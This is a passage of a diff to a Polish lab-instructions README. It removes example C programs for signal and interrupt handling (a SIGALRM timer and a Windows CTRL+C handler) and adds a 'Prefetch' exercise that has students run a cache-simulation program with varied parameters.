-    sa.sa_handler = &timer_handler;
-    sigaction(SIGALRM, &sa, NULL);
-
-    ualarm(500000, 500000); // Wysyłanie sygnału SIGALRM co 500ms
-
-    while (1) {
-        pause(); // Czekanie na przerwanie
-    }
-    #endif
-
-    return 0;
-}
-
+  -c, --cache size
+  -b, --block size
+  -n, --iteration
+  -m, --memory size
 ```
 
-W systemie Windows obsługa przerwań może być realizowana za pomocą różnych mechanizmów. Jeden z nich to obsługa sygnałów za pomocą funkcji `SetConsoleCtrlHandler`. Oto przykład programu, który obsługuje sygnał `CTRL+C`:
+**Lab_18** Prefetch
 
-**Lab_20**
-```c
-#include <stdio.h>
-#include <windows.h>
 
-BOOL WINAPI ConsoleCtrlHandler(DWORD signal)
-{
-    if (signal == CTRL_C_EVENT) {
-        printf("Przerwanie CTRL+C!\n");
-        return TRUE;
-    }
+Proszę uruchomić program, opisać w sprawozdaniu jego wynik. Należy kilka razy zmodyfikować parametry:
 
-    return FALSE;
-}
+- ```-c 1024 -b 32 -n 10000 -m 2048 -d 1```
+- ```-c 1024 -b 64 -n 10000 -m 2048 -d 2```
+- ```-c 2048 -b 32 -n 10000 -m 4096 -d 4```
+- ```-c 2048 -b 64 -n 10000 -m 4096 -d 8```
+- inna konfiguracja wg uznania z taką samą liczbą iteracji
+- inna konfiguracja wg uznania z taką samą liczbą iteracji
 
-int main()
-{
-    if (!SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE)) 
-    {
-        fprintf(stderr, "Nie mozna zarejestrowac procedury obslugi.\n");
-        return EXIT_FAILURE;
-    }
+$lab_18.exe -c 1024 -b 32 -n 10000 -m 1024 -d 8
 
-    printf("Nacisnij CTRL+C, aby wywolac przerwanie.\n");
-
-    while(true) 
-    {
-        printf(".");
-        Sleep(1000); // Czekanie na przerwanie
-    }
-}
+  -c, --cache size
+  -b, --block size
+  -n, --iteration
+  -m, --memory size
+  -d, --prefetch distance
 ```
-
-W powyższym kodzie, zdefiniowano funkcję `ConsoleCtrlHandler`, która zostanie wywołana, gdy zostanie wygenerowany sygnał `CTRL+C`. W funkcji `main`, rejestrujemy tę funkcję jako procedurę obsługi sygnału za pomocą funkcji `SetConsoleCtrlHandler`. Następnie program wchodzi w pętlę nieskończoną, czekając na przerwanie `CTRL+C`. Gdy przerwanie wystąpi, zostanie wyświetlony komunikat "Przerwanie CTRL+C!" i program będzie kontynuować działanie.
-
